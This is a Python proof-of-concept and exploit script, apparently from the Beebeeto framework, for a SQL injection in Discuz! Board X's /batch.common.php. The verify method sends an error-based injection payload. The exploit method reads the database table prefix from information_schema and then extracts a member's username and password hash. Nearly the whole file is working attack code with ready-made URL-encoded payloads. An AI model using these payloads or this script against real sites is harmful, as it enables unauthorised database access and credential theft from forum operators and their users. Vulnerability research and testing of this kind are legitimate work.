#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0006',
            'name': 'Discuz! Board X /batch.common.php SQL注入漏洞 POC & Exploit',
            'author': '小马甲',
            'create_date': '2015-01-11',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Discuz',
            'vul_version': ['1.0.0'],
            'type': 'SQL Injection',
            'tag': ['Discuz Board X漏洞', 'SQL注入漏洞', '/batch.common.php', 'php'],
            'desc': 'N/A',
            'references': ['http://www.wooyun.org/bugs/wooyun-2014-080470',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        verify_url = '%s/batch.common.php' % args['options']['target']
        payload = '?action=modelquote&cid=1&name=spacecomments,(SELECT 3284 FROM(SELECT COUNT(*),CONCAT(CH' \
                  'AR(58,105,99,104,58),(MID((IFNULL(CAST(md5(160341893519135) AS CHAR),CHAR(32))),1,50)),' \
                  'CHAR(58,107,111,117,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)'
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url + payload
        content = requests.get(verify_url + payload).content
        if '3c6b20b60b3f57247420047ab16d3d71' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url + payload
        return args


    @classmethod
    def exploit(cls, args):
        verify_url = '%s/batch.common.php' % args['options']['target']
        payload_table_priv = '?action=modelquote&cid=1&name=spacecomments,(SELECT%206050%20FROM(SELECT%20C' \
                             'OUNT(*),CONCAT(CHAR(58,114,103,101,58),(SELECT%20MID((IFNULL(CAST(table_name' \
                             '%20AS%20CHAR),CHAR(32))),1,50)%20FROM%20information_schema.tables%20where%20' \
                             'table_schema=database()%20LIMIT%200,1),CHAR(58,110,98,115,58),FLOOR(RAND(0)*' \
                             '2))x%20FROM%20information_schema.tables%20GROUP%20BY%20x)a)'
        match_table_priv = re.compile(':rge:(.*)access:nbs:1')
        try:
            table_priv = match_table_priv.findall(requests.get(verify_url + payload_table_priv).content)[0]
        except:
            return args
        table_priv = 'cdb_' if table_priv == '[Table]' else table_priv
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url + payload_table_priv

        payload = '?action=modelquote&cid=1&name=spacecomments,(SELECT%206050%20FROM(SELECT%20COUNT(*),CON' \
                  'CAT(CHAR(58,114,103,101,58),(SELECT%20MID((IFNULL(CAST(concat(username,0x3a3a,password)' \
                  '%20AS%20CHAR),CHAR(32))),1,50)%20FROM%20' + table_priv + 'members%20LIMIT%200,1),CHAR(5' \
                  '8,110,98,115,58),FLOOR(RAND(0)*2))x%20FROM%20information_schema.tables%20GROUP%20BY%20x)a)'
        match_result = re.compile(':rge:(.*)::([\w\d]{32}):nbs:')
        try:
            username, password = match_result.findall(requests.get(verify_url + payload).content)[0]
        except:
            return args
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url + payload

        if username and password:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            args['poc_ret']['username'] = username
            args['poc_ret']['password'] = password
        return args


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())